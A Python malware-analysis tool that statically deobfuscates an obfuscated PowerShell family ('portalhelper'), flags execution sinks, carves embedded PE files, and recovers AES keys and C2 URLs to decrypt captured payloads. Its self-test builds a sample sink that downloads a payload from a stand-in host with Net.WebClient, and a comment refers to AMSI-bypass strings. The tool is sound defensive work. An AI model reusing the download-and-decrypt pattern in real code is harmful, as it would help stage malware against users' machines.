#!/usr/bin/env python3
"""
Static deobfuscator for the 'portalhelper' obfuscated PowerShell family.

WHAT THIS DOES
--------------
The sample builds every string from arrays of small integers, converting each
element with [char](value + KEY). The KEY (72) is not written as a literal.
Instead the script bootstraps it at runtime:

    "104"  and  "25"      ->  [int64]"104" + [int64]"25"  = 129
    @(-74,-79) + 129      ->  "72"                         (a string)
    [int64]"72"           =  72                            ($NGDJ1L2)

Every payload array is then decoded as chr(value + 72). This tool reproduces
that math statically. It is a STRING-RECOVERY interpreter: it evaluates the
arithmetic used to derive the key and to rebuild strings, but it NEVER runs
any recovered PowerShell, never touches the network, and never spawns a shell.
It only turns obfuscated integer arrays back into readable text so an analyst
can read the payload.

USAGE
-----
    python3 deobfuscate_portalhelper.py portalhelper.txt
    python3 deobfuscate_portalhelper.py portalhelper.txt --key 72
    python3 deobfuscate_portalhelper.py portalhelper.txt --out decoded.ps1
    python3 deobfuscate_portalhelper.py portalhelper.txt --self-test

By default the additive key is resolved automatically from the bootstrap chain.
Pass --key N to force a specific offset for the payload arrays.
"""

import argparse
import base64
import hashlib
import json
import os
import re
import sys

# ---------------------------------------------------------------------------
# Regexes for the statement shapes this family uses.
# ---------------------------------------------------------------------------

# A char-build loop:
#   $out='';$arr=@(NUMS);for(...){$out+=[char]([int64]$arr[$i]( +[int64]$key)? )}
CHAR_LOOP = re.compile(
    r"""\$(?P<out>\w+)\s*=\s*''\s*;\s*
        \$(?P<arr>\w+)\s*=\s*@\((?P<nums>.*?)\)\s*;\s*
        for\([^)]*\)\s*\{\s*
        \$(?P=out)\s*\+=\s*\[char\]\(\s*
        \[int64\]\$(?P=arr)\[\$\w+\]
        (?:\s*\+\s*\[int64\]\$(?P<key>\w+))?
        \s*\)\s*\}""",
    re.VERBOSE,
)

# A plain empty-string init: $v=''
EMPTY_INIT = re.compile(r"^\s*\$(?P<out>\w+)\s*=\s*''\s*$")

# An integer assignment built from other variables:
#   $v=[int64]$a           or   $v=[int64]$a+[int64]$b
INT_ASSIGN = re.compile(
    r"^\s*\$(?P<out>\w+)\s*=\s*"
    r"\[int64\]\$(?P<a>\w+)"
    r"(?:\s*\+\s*\[int64\]\$(?P<b>\w+))?\s*$"
)

# A string accumulation: $acc += $src
#   This family builds every scriptblock sink by decoding many small pieces in
#   char-loops and then concatenating them into one variable:
#       $piece='';...for(...){$piece+=[char](...)};$acc+=$piece
#   The loop is consumed by CHAR_LOOP; the trailing ';$acc+=$piece' lands here.
#   Resolving these appends is pure data-flow (string joining), NOT execution,
#   so it stays inside this tool's "never run recovered code" contract.
STR_APPEND = re.compile(r"^\s*\$(?P<out>\w+)\s*\+=\s*\$(?P<src>\w+)\s*$")

# A plain string assignment from another variable: $acc = $src
STR_ASSIGN = re.compile(r"^\s*\$(?P<out>\w+)\s*=\s*\$(?P<src>\w+)\s*$")

# Execution sinks worth flagging to the analyst.
SINK = re.compile(
    r"""(?P<kind>
            iex\s*\(\s*\$(?P<v1>\w+)\s*\)
          | Invoke-Expression\s+\$(?P<v2>\w+)
          | \[scriptblock\]::Create\(\s*\$(?P<v3>\w+)\s*\)
          | \&\s*\(\s*\$(?P<v4>\w+)\s*\)
        )""",
    re.VERBOSE | re.IGNORECASE,
)

INT_RE = re.compile(r"-?\d+")

# ---------------------------------------------------------------------------
# Payload-crypto recovery.
#
# Once the sinks are assembled and --inline has folded the recovered strings in,
# the AES parameters this family uses appear as bare base64 literals, e.g.
#     $a.Mode='CBC';$a.Padding='PKCS7'
#     $a.Key=$fb.Invoke($null,@(3za3...Fto=))
#     $a.IV=$fb.Invoke($null,@(VtRw...amw==))
# A {16,} length floor keeps identifiers like 'Invoke' from matching as base64.
# ---------------------------------------------------------------------------
B64 = r"([A-Za-z0-9+/]{16,}={0,2})"
AES_KEY_RE = re.compile(r"\.Key\s*=.{0,160}?" + B64, re.S)
AES_IV_RE = re.compile(r"\.IV\s*=.{0,160}?" + B64, re.S)
AES_MODE_RE = re.compile(r"\.Mode\s*=\s*'?([A-Za-z0-9]+)'?")
AES_PAD_RE = re.compile(r"\.Padding\s*=\s*'?([A-Za-z0-9]+)'?")
URL_RE = re.compile(r"https?://[^\s'\")]+")


def parse_ints(nums_blob):
    """Pull signed integers out of a PowerShell array body like '(-36),29,(-14)'."""
    return [int(m.group()) for m in INT_RE.finditer(nums_blob)]


def as_int(value):
    """Coerce a recovered value (int or numeric string) to int, PowerShell style."""
    if isinstance(value, int):
        return value
    return int(str(value).strip())


def as_str(value):
    """Coerce a recovered value to str; missing/None becomes ''."""
    if value is None:
        return ""
    return value if isinstance(value, str) else str(value)


def decode_chars(nums, offset):
    """chr(n + offset) for each n, tolerating out-of-range values gracefully."""
    out = []
    for n in nums:
        code = n + offset
        if 0 <= code <= 0x10FFFF:
            out.append(chr(code))
        else:
            out.append("�")  # replacement char for anything nonsensical
    return "".join(out)


def deobfuscate(text, forced_key=None):
    """
    Walk the script statement by statement in order.
    Returns (env, events) where env maps variable -> recovered value and
    events is an ordered list of ('assign'|'sink', ...) records for reporting.
    """
    env = {}
    events = []

    # Split into statements. This family uses newlines and ';' between the
    # top-level statements; the char-loop body has its own ';' inside {},
    # so we match the whole loop first, then handle the leftovers.
    #
    # Strategy: scan the file, greedily consuming any CHAR_LOOP match, and
    # process the text between matches line by line for the simpler shapes.
    pos = 0
    for m in CHAR_LOOP.finditer(text):
        # Handle anything between the previous match and this one.
        _process_plain(text[pos:m.start()], env, events)

        out = m.group("out")
        nums = parse_ints(m.group("nums"))
        keyvar = m.group("key")

        if keyvar is None:
            offset = 0  # raw [char] conversion (bootstrap digit strings)
        elif forced_key is not None:
            offset = forced_key
        elif keyvar in env:
            offset = as_int(env[keyvar])
        else:
            # Key not yet resolved and not forced: fall back to 72, the known
            # value for this family, but record the uncertainty.
            offset = 72

        value = decode_chars(nums, offset)
        env[out] = value
        events.append(("assign", out, value, offset, keyvar))
        pos = m.end()

    _process_plain(text[pos:], env, events)
    return env, events


def _process_plain(chunk, env, events):
    """Handle non-loop statements: '' inits, int math, and execution sinks."""
    # Break on both ';' and newlines for these simple one-liners.
    for stmt in re.split(r"[;\n]", chunk):
        stmt = stmt.strip()
        if not stmt:
            continue

        m = INT_ASSIGN.match(stmt)
        if m and m.group("a") in env:
            total = as_int(env[m.group("a")])
            if m.group("b") is not None and m.group("b") in env:
                total += as_int(env[m.group("b")])
            env[m.group("out")] = total
            events.append(("assign", m.group("out"), total, None, "int"))
            continue

        # $acc += $src  — assemble a scriptblock sink from its decoded pieces.
        m = STR_APPEND.match(stmt)
        if m:
            out, src = m.group("out"), m.group("src")
            env[out] = as_str(env.get(out, "")) + as_str(env.get(src))
            events.append(("append", out, env[out], None, src))
            continue

        # $acc = $src  — a straight string copy between recovered variables.
        m = STR_ASSIGN.match(stmt)
        if m and m.group("src") in env:
            env[m.group("out")] = as_str(env[m.group("src")])
            events.append(("assign", m.group("out"), env[m.group("out")], None, "copy"))
            continue

        m = EMPTY_INIT.match(stmt)
        if m:
            env.setdefault(m.group("out"), "")
            continue

        for sm in SINK.finditer(stmt):
            var = sm.group("v1") or sm.group("v2") or sm.group("v3") or sm.group("v4")
            events.append(("sink", var, env.get(var, "<unresolved>"), None, None))


def resolve_key(env):
    """Report the additive key this sample derived, if the chain is present."""
    for name, val in env.items():
        if isinstance(val, int) and val == 72:
            return name, val
    return None, None


def inline_vars(text, env, max_passes=3):
    """
    Substitute $name references with their statically-recovered string value.

    This makes a scriptblock sink self-contained: references like
    $xzmQUDFc5Unm become the literal "System.Management.Automation.AmsiUtils".
    Only variables we resolved to a non-empty string are substituted; genuine
    runtime variables ($__self, $global:..., loop temporaries) were never
    decoded, so they are absent from env and left untouched.

    We use a *function* replacement (not a string one) so backslashes and
    regex-special characters inside recovered paths are inserted verbatim.
    """
    resolved = {k: v for k, v in env.items() if isinstance(v, str) and v != ""}
    # Longest names first so $abc is resolved before its prefix $ab.
    names = sorted(resolved, key=len, reverse=True)
    for _ in range(max_passes):
        changed = False
        for name in names:
            pat = re.compile(r"\$" + re.escape(name) + r"(?![A-Za-z0-9_])")
            new = pat.sub(lambda _m, val=resolved[name]: val, text)
            if new != text:
                text, changed = new, True
        if not changed:
            break
    return text


# Base64 prefixes that decode to an 'MZ' DOS/PE header (little variation in the
# 3rd byte of the DOS header shifts the 4th base64 char).
_PE_B64_PREFIXES = ("TVqQ", "TVpQ", "TVoA", "TVpB", "TVro")


def _b64_to_bytes(s):
    """Decode a (possibly unpadded / whitespace-wrapped) base64 string to bytes.
    Returns None if it is not valid base64."""
    s = "".join(s.split())
    try:
        return base64.b64decode(s + "=" * ((-len(s)) % 4), validate=False)
    except Exception:
        return None


def _pe_machine(raw):
    """Best-effort PE machine type from the COFF header ('x64'/'x86'/...)."""
    try:
        e_lfanew = int.from_bytes(raw[0x3C:0x40], "little")
        if raw[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
            return "?"
        machine = int.from_bytes(raw[e_lfanew + 4:e_lfanew + 6], "little")
        return {0x8664: "x64", 0x14C: "x86", 0xAA64: "arm64"}.get(machine, hex(machine))
    except Exception:
        return "?"


def _pe_type(raw):
    """
    Best-effort PE image kind: 'dll', 'exe', or 'sys' (kernel driver).

    Derived from the COFF Characteristics (IMAGE_FILE_DLL) and the optional
    header Subsystem (NATIVE => driver). This only *labels* a carved file for
    the analyst; carved files keep their neutral .bin extension by design.
    """
    try:
        e = int.from_bytes(raw[0x3C:0x40], "little")
        if raw[e:e + 4] != b"PE\x00\x00":
            return "?"
        characteristics = int.from_bytes(raw[e + 22:e + 24], "little")
        opt = e + 24  # optional header; Subsystem sits at +68 in PE32 and PE32+
        subsystem = int.from_bytes(raw[opt + 68:opt + 70], "little")
        if subsystem == 1:              # IMAGE_SUBSYSTEM_NATIVE -> kernel driver
            return "sys"
        if characteristics & 0x2000:    # IMAGE_FILE_DLL
            return "dll"
        return "exe"
    except Exception:
        return "?"


def collect_pes(env):
    """
    Find recovered strings that base64-decode to a real PE (MZ) image and
    return a structured record per hit, including cryptographic hashes.

    The decoded bytes are kept under the private '_bytes' key for carving;
    strip it before JSON-serialising a record (see pe_public()).
    """
    out = []
    for name, val in env.items():
        if not (isinstance(val, str) and len(val) > 200):
            continue
        s = val.strip()
        if not s.startswith(_PE_B64_PREFIXES):
            continue
        raw = _b64_to_bytes(s)
        if not raw or raw[:2] != b"MZ":
            continue  # looked like base64-MZ but did not decode to one
        out.append({
            "variable": name,
            "b64_len": len(s),
            "size_bytes": len(raw),
            "machine": _pe_machine(raw),
            "pe_type": _pe_type(raw),
            "md5": hashlib.md5(raw).hexdigest(),
            "sha1": hashlib.sha1(raw).hexdigest(),
            "sha256": hashlib.sha256(raw).hexdigest(),
            "_bytes": raw,
        })
    return out


def pe_public(rec):
    """A copy of a PE record safe to serialise (drops the raw bytes)."""
    return {k: v for k, v in rec.items() if k != "_bytes"}


def carve_pes(pes, outdir):
    """Write each PE record's bytes to <outdir>/<variable>.bin, recording the
    output path back onto the record. Returns the (mutated) list."""
    os.makedirs(outdir, exist_ok=True)
    for rec in pes:
        path = os.path.join(outdir, f"{rec['variable']}.bin")
        with open(path, "wb") as fh:
            fh.write(rec["_bytes"])
        rec["path"] = path
    return pes


def sink_text(env, events):
    """All sink bodies, variable-inlined and joined — the searchable plaintext."""
    parts = []
    for kind, var, val, _, _ in events:
        if kind == "sink":
            parts.append(inline_vars(as_str(env.get(var, val)), env))
    return "\n".join(parts)


def extract_crypto(env, events):
    """
    Recover the payload's AES parameters and C2 URLs straight from the
    assembled sinks, so a captured blob can be decrypted without hand-copying
    hex. Returns a dict; key/iv are None when the sample has no crypto sink.
    """
    text = sink_text(env, events)
    info = {"algorithm": None, "mode": None, "padding": None,
            "key_b64": None, "iv_b64": None, "key_hex": None, "iv_hex": None,
            "key_bits": None, "urls": sorted(set(URL_RE.findall(text)))}

    m = AES_MODE_RE.search(text)
    if m:
        info["mode"] = m.group(1)
    m = AES_PAD_RE.search(text)
    if m:
        info["padding"] = m.group(1)

    for field, rx in (("key", AES_KEY_RE), ("iv", AES_IV_RE)):
        m = rx.search(text)
        if not m:
            continue
        b64 = m.group(1)
        raw = _b64_to_bytes(b64)
        # AES keys are 16/24/32 bytes; the IV is always one 16-byte block.
        if raw is None or len(raw) not in ((16, 24, 32) if field == "key" else (16,)):
            continue
        info[f"{field}_b64"] = b64
        info[f"{field}_hex"] = raw.hex()

    if info["key_hex"]:
        info["key_bits"] = len(bytes.fromhex(info["key_hex"])) * 8
        info["algorithm"] = f"AES-{info['key_bits']}-{info['mode'] or '?'}"
    return info


def openssl_cmd(info, blob="<blob>", out="decrypted.bin"):
    """The equivalent openssl one-liner, for analysts who prefer the CLI."""
    if not (info.get("key_hex") and info.get("iv_hex")):
        return None
    algo = f"aes-{info['key_bits']}-{(info['mode'] or 'cbc').lower()}"
    return (f"openssl enc -d -{algo} -K {info['key_hex']} "
            f"-iv {info['iv_hex']} -in {blob} -out {out}")


def _aes_cbc_decrypt(data, key, iv):
    """AES-CBC decrypt with whichever crypto library is installed."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        return Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor().update(data)
    except ImportError:
        pass
    try:
        from Crypto.Cipher import AES  # pycryptodome
        return AES.new(key, AES.MODE_CBC, iv).decrypt(data)
    except ImportError:
        raise SystemExit(
            "No AES library available. Install one with:\n"
            "    pip install cryptography\n"
            "...or decrypt with the openssl command shown in the report."
        )


def _strip_pkcs7(pt):
    """Strip PKCS7 padding. Returns (plaintext, padding_was_valid).

    Valid padding is strong evidence the key/IV are correct AND that the
    captured blob is complete rather than truncated.
    """
    if not pt:
        return pt, False
    n = pt[-1]
    if 1 <= n <= 16 and pt[-n:] == bytes([n]) * n:
        return pt[:-n], True
    return pt, False


def decrypt_payload(blob_path, info, out_path):
    """
    Decrypt a captured C2 blob using parameters recovered from the sinks.
    Writes the plaintext to out_path and returns a result record.
    """
    if not (info.get("key_hex") and info.get("iv_hex")):
        raise SystemExit("No AES key/IV recovered from this sample's sinks — "
                         "nothing to decrypt with.")
    if (info.get("mode") or "CBC").upper() != "CBC":
        raise SystemExit(f"Unsupported AES mode {info['mode']!r}; only CBC is implemented.")

    key = bytes.fromhex(info["key_hex"])
    iv = bytes.fromhex(info["iv_hex"])
    with open(blob_path, "rb") as fh:
        data = fh.read()

    rec = {"input": blob_path, "input_size": len(data),
           "input_sha256": hashlib.sha256(data).hexdigest(),
           "block_aligned": len(data) % 16 == 0}
    if not rec["block_aligned"]:
        rec["warning"] = (f"blob is not a multiple of 16 bytes ({len(data) % 16} "
                          "left over) — capture may be truncated")

    pt = _aes_cbc_decrypt(data, key, iv)
    if (info.get("padding") or "PKCS7").upper().startswith("PKCS"):
        pt, ok = _strip_pkcs7(pt)
        rec["pkcs7_valid"] = ok
        if not ok:
            rec["warning"] = ("PKCS7 padding did NOT validate — wrong key/IV, or "
                              "the blob is truncated/not this payload")
    rec.update({
        "output": out_path,
        "size_bytes": len(pt),
        "md5": hashlib.md5(pt).hexdigest(),
        "sha1": hashlib.sha1(pt).hexdigest(),
        "sha256": hashlib.sha256(pt).hexdigest(),
        "is_pe": pt[:2] == b"MZ",
        "machine": _pe_machine(pt) if pt[:2] == b"MZ" else None,
        "pe_type": _pe_type(pt) if pt[:2] == b"MZ" else None,
    })
    with open(out_path, "wb") as fh:
        fh.write(pt)
    return rec


def build_report(env, events, show_payload, inline=False, pes=None):
    if pes is None:
        pes = collect_pes(env)
    lines = []
    keyname, keyval = resolve_key(env)
    lines.append("=" * 70)
    lines.append("portalhelper deobfuscation report")
    lines.append("=" * 70)
    if keyname:
        lines.append(f"Resolved additive key: {keyval}  (variable ${keyname})")
    lines.append("")

    sinks = [e for e in events if e[0] == "sink"]
    n_pieces = sum(1 for e in events if e[0] == "assign" and isinstance(e[2], str))
    n_appends = sum(1 for e in events if e[0] == "append")
    lines.append(f"Recovered string pieces           : {n_pieces}")
    lines.append(f"String-append (+=) operations     : {n_appends}")
    lines.append(f"Execution sinks (iex / scriptblock::Create / &) : {len(sinks)}")

    if pes:
        lines.append("")
        lines.append("--- embedded executables (IOC) ---")
        for rec in pes:
            lines.append(f"  ${rec['variable']} : PE/MZ {rec['machine']} {rec['pe_type']}, "
                         f"{rec['size_bytes']} bytes ({rec['b64_len']} b64 chars)")
            lines.append(f"      sha256 {rec['sha256']}")
            lines.append(f"      md5    {rec['md5']}")
            if rec.get("path"):
                lines.append(f"      carved {rec['path']}  "
                             f"(true type .{rec['pe_type']}; extension left as .bin)")

    info = extract_crypto(env, events)
    if info["key_b64"] or info["urls"]:
        lines.append("")
        lines.append("--- payload crypto / C2 (recovered from sinks) ---")
        for url in info["urls"]:
            lines.append(f"  C2 URL    : {url}")
        if info["algorithm"]:
            lines.append(f"  algorithm : {info['algorithm']} / {info['padding'] or '?'} padding")
        if info["key_b64"]:
            lines.append(f"  key (b64) : {info['key_b64']}")
            lines.append(f"  key (hex) : {info['key_hex']}")
        if info["iv_b64"]:
            lines.append(f"  iv  (b64) : {info['iv_b64']}")
            lines.append(f"  iv  (hex) : {info['iv_hex']}")
        cmd = openssl_cmd(info)
        if cmd:
            lines.append(f"  decrypt   : {cmd}")
            lines.append("              (or: rev.py <sample> --decrypt-payload <blob>)")
    lines.append("")

    lines.append("--- execution sinks (these run the recovered code) ---")
    for _, var, val, _, _ in sinks:
        # Re-read from env: the accumulator is fully assembled by sink time.
        body = as_str(env.get(var, val))
        if inline:
            body = inline_vars(body, env)
        if not show_payload:
            lines.append(f"  ${var} -> [{len(body)} chars withheld; rerun with --show-payload]")
        else:
            lines.append(f"  ${var} ({len(body)} chars):")
            for bl in body.splitlines() or [""]:
                lines.append(f"      {bl}")
            lines.append("")
    lines.append("")

    if show_payload:
        lines.append("--- all recovered strings, in order ---")
        for kind, name, val, offset, keyvar in events:
            if kind == "assign" and isinstance(val, str) and val:
                lines.append(f"[{name}] {val}")
    return "\n".join(lines)


def build_json(env, events, sample, inline=False, pes=None, decrypted=None):
    """Machine-readable summary for pipelines: key, stats, sinks, and IOCs.

    Sink bodies are always included (this format is for tooling, not screen
    triage); pass inline=True to inline recovered $variables into those bodies.
    """
    if pes is None:
        pes = collect_pes(env)
    keyname, keyval = resolve_key(env)
    sinks = []
    for _, var, val, _, _ in (e for e in events if e[0] == "sink"):
        body = as_str(env.get(var, val))
        if inline:
            body = inline_vars(body, env)
        sinks.append({"variable": var, "length": len(body), "body": body})
    return {
        "sample": sample,
        "key": {"value": keyval, "variable": keyname},
        "inlined": bool(inline),
        "stats": {
            "pieces": sum(1 for e in events if e[0] == "assign" and isinstance(e[2], str)),
            "appends": sum(1 for e in events if e[0] == "append"),
            "sinks": len(sinks),
        },
        "sinks": sinks,
        "embedded_pe": [pe_public(r) for r in pes],
        "payload_crypto": extract_crypto(env, events),
        "decrypted_payload": decrypted,
    }


def self_test():
    """
    Prove the decoder is correct against one already-known-benign fragment.
    Line 6 of the sample decodes (with key 72) to a harmless header that begins
    with the $env: assignment. We assert only that prefix, so this test never
    depends on printing the malicious body.
    """
    nums = [-36, 29, 38, 46, -14, 23, 23, 11, 8, -11, -36, 5, 49, 1, 38, 46,
            39, 27, 25, 44, 33, 39, 38, -26, 5, 49]
    got = decode_chars(nums, 72)
    expected_prefix = "$env:__SP=$MyInvocation.My"
    assert got == expected_prefix, f"self-test FAILED: got {got!r}"
    print("self-test PASSED: key=72 decodes the header fragment correctly")
    print(f"  decoded: {got!r}")

    # Prove the accumulator + inlining path end to end on a tiny synthetic
    # sample shaped exactly like the real family.
    sample = (
        "$p1='';$a1=@(32,29,36,36);for($i=0;$i -lt $a1.Length;$i++)"
        "{$p1+=[char]([int64]$a1[$i]+[int64]$NG)};$acc+=$p1\n"
        "$p2='';$a2=@(39);for($j=0;$j -lt $a2.Length;$j++)"
        "{$p2+=[char]([int64]$a2[$j]+[int64]$NG)};$acc+=$p2\n"
        ". ([scriptblock]::Create($acc))\n"
    )
    env, events = deobfuscate("$acc=''\n" + sample, forced_key=72)
    assert env.get("acc") == "hello", f"append self-test FAILED: got {env.get('acc')!r}"
    sink = [e for e in events if e[0] == "sink"][0]
    assert sink[2] == "hello", f"sink self-test FAILED: got {sink[2]!r}"
    inlined = inline_vars("run $acc now", env)
    assert inlined == "run hello now", f"inline self-test FAILED: got {inlined!r}"
    print("self-test PASSED: accumulator assembly, sink capture, and inlining work")

    # Prove PE detection + hashing + type/machine parsing on a synthetic PE32+
    # DLL image (x64, GUI subsystem, IMAGE_FILE_DLL set).
    buf = bytearray(b"MZ" + b"\x00" * 0x100)
    e = 0x80
    buf[0x3C:0x40] = e.to_bytes(4, "little")
    buf[e:e + 4] = b"PE\x00\x00"
    buf[e + 4:e + 6] = (0x8664).to_bytes(2, "little")    # machine: x64
    buf[e + 22:e + 24] = (0x2000).to_bytes(2, "little")  # characteristics: DLL
    buf[e + 24:e + 26] = (0x20B).to_bytes(2, "little")   # optional magic: PE32+
    buf[e + 24 + 68:e + 24 + 70] = (2).to_bytes(2, "little")  # subsystem: GUI
    fake_pe = bytes(buf)
    fake_env = {"payload": base64.b64encode(fake_pe).decode()}
    pes = collect_pes(fake_env)
    assert len(pes) == 1, f"pe self-test FAILED: found {len(pes)} PEs"
    assert pes[0]["size_bytes"] == len(fake_pe)
    assert pes[0]["sha256"] == hashlib.sha256(fake_pe).hexdigest()
    assert pes[0]["_bytes"] == fake_pe
    assert pes[0]["machine"] == "x64", f"machine FAILED: {pes[0]['machine']}"
    assert pes[0]["pe_type"] == "dll", f"pe_type FAILED: {pes[0]['pe_type']}"
    print("self-test PASSED: embedded-PE detection, hashing, and type parsing work")

    # Prove crypto-parameter scraping against a sink shaped like the real one.
    k_b64 = base64.b64encode(bytes(range(32))).decode()   # 32-byte AES-256 key
    iv_b64 = base64.b64encode(bytes(range(16))).decode()  # 16-byte IV
    crypto_sink = (
        "$__wc=New-Object Net.WebClient;"
        "$x=$__wc.DownloadData(https://example.invalid:5173/api/v1/payload?gk=abc)\n"
        "$a=New-Object System.Security.Cryptography.AesCryptoServiceProvider;"
        "$a.Mode='CBC';$a.Padding='PKCS7';"
        f"$a.Key=$fb.Invoke($null,@({k_b64}));"
        f"$a.IV=$fb.Invoke($null,@({iv_b64}))"
    )
    fake_env = {"blob": crypto_sink}
    fake_events = [("sink", "blob", crypto_sink, None, None)]
    info = extract_crypto(fake_env, fake_events)
    assert info["key_b64"] == k_b64, f"key scrape FAILED: {info['key_b64']}"
    assert info["iv_b64"] == iv_b64, f"iv scrape FAILED: {info['iv_b64']}"
    assert info["mode"] == "CBC" and info["padding"] == "PKCS7", f"mode/pad FAILED: {info}"
    assert info["key_bits"] == 256, f"key_bits FAILED: {info['key_bits']}"
    assert info["urls"] == ["https://example.invalid:5173/api/v1/payload?gk=abc"], \
        f"url scrape FAILED: {info['urls']}"
    print("self-test PASSED: AES key/IV/mode/URL scraped from sink text")

    # Round-trip: encrypt a known plaintext, then decrypt via the tool's path.
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except ImportError:
        print("self-test SKIPPED: no crypto lib for the decrypt round-trip")
        return
    import tempfile
    key, iv = bytes(range(32)), bytes(range(16))
    plain = b"MZ" + b"\x00" * 300
    padded = plain + bytes([16 - len(plain) % 16]) * (16 - len(plain) % 16)
    ct = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor().update(padded)
    with tempfile.TemporaryDirectory() as td:
        blob = os.path.join(td, "blob.bin")
        with open(blob, "wb") as fh:
            fh.write(ct)
        out = os.path.join(td, "out.bin")
        rec = decrypt_payload(blob, info, out)
        assert rec["pkcs7_valid"], "round-trip padding FAILED"
        assert open(out, "rb").read() == plain, "round-trip plaintext MISMATCH"
        assert rec["is_pe"] and rec["sha256"] == hashlib.sha256(plain).hexdigest()
    print("self-test PASSED: AES-CBC decrypt round-trip (padding + plaintext match)")


def main():
    ap = argparse.ArgumentParser(description="Static deobfuscator for portalhelper PowerShell.")
    ap.add_argument("sample", nargs="?", help="path to the obfuscated .txt/.ps1 sample")
    ap.add_argument("--key", type=int, default=None,
                    help="force the additive key for payload arrays (default: auto-resolve, 72)")
    ap.add_argument("--out", help="write the full recovered script to this file")
    ap.add_argument("--show-payload", action="store_true",
                    help="print the full decoded payload to stdout (off by default)")
    ap.add_argument("--inline", action="store_true",
                    help="substitute recovered $variables into sink bodies so each "
                         "scriptblock reads as self-contained plaintext")
    ap.add_argument("--json", action="store_true",
                    help="emit a machine-readable JSON summary (key, stats, sinks, "
                         "IOCs) to stdout instead of the text report")
    ap.add_argument("--dump-pe", metavar="DIR",
                    help="carve every embedded base64 PE to DIR/<var>.bin for triage")
    ap.add_argument("--decrypt-payload", metavar="BLOB",
                    help="decrypt a captured C2 blob using the AES key/IV recovered "
                         "from this sample's sinks")
    ap.add_argument("--decrypt-out", metavar="FILE",
                    help="where to write the decrypted blob "
                         "(default: <BLOB>.decrypted.bin)")
    ap.add_argument("--self-test", action="store_true",
                    help="run the built-in correctness check and exit")
    args = ap.parse_args()

    if args.self_test:
        self_test()
        return

    if not args.sample:
        ap.error("provide a sample file (or use --self-test)")

    with open(args.sample, "r", errors="replace") as fh:
        text = fh.read()

    env, events = deobfuscate(text, forced_key=args.key)

    # Collect embedded PEs once; carve to disk first so the path shows in reports.
    pes = collect_pes(env)
    if args.dump_pe and pes:
        carve_pes(pes, args.dump_pe)

    decrypted = None
    if args.decrypt_payload:
        out_path = args.decrypt_out or (args.decrypt_payload + ".decrypted.bin")
        decrypted = decrypt_payload(args.decrypt_payload,
                                    extract_crypto(env, events), out_path)

    if args.json:
        summary = build_json(env, events, args.sample, inline=args.inline,
                             pes=pes, decrypted=decrypted)
        print(json.dumps(summary, indent=2))
        return

    report = build_report(env, events, show_payload=args.show_payload,
                          inline=args.inline, pes=pes)
    print(report)

    if args.dump_pe:
        if pes:
            print(f"\nCarved {len(pes)} embedded PE(s) to: {args.dump_pe}")
        else:
            print("\nNo embedded PE payloads found to carve.")

    if decrypted:
        print("\n--- decrypted C2 payload ---")
        print(f"  input        : {decrypted['input']} "
              f"({decrypted['input_size']:,} bytes, "
              f"block-aligned={decrypted['block_aligned']})")
        print(f"  input sha256 : {decrypted['input_sha256']}")
        if "pkcs7_valid" in decrypted:
            ok = decrypted["pkcs7_valid"]
            print(f"  PKCS7 padding: {'valid (key/IV correct, blob complete)' if ok else 'INVALID'}")
        if decrypted.get("warning"):
            print(f"  WARNING      : {decrypted['warning']}")
        kind = (f"PE/MZ {decrypted['machine']} {decrypted['pe_type']}"
                if decrypted["is_pe"] else "not a PE (raw shellcode or data)")
        print(f"  output       : {decrypted['output']} "
              f"({decrypted['size_bytes']:,} bytes) -> {kind}")
        print(f"  sha256       : {decrypted['sha256']}")
        print(f"  md5          : {decrypted['md5']}")

    if args.out:
        sinks = [e for e in events if e[0] == "sink"]
        with open(args.out, "w") as fh:
            fh.write("# Reconstructed sinks from " + (args.sample or "?") + "\n")
            fh.write("# Each block is the fully-assembled code passed to an "
                     "execution sink.\n")
            if args.inline:
                fh.write("# Recovered $variables have been inlined for readability.\n")
            fh.write("\n")
            for _, var, val, _, _ in sinks:
                body = as_str(env.get(var, val))
                if args.inline:
                    body = inline_vars(body, env)
                fh.write(f"# ===== sink: ${var}  ({len(body)} chars) =====\n")
                fh.write(body + "\n\n")
        print(f"\nReconstructed sinks written to: {args.out}")


if __name__ == "__main__":
    main()
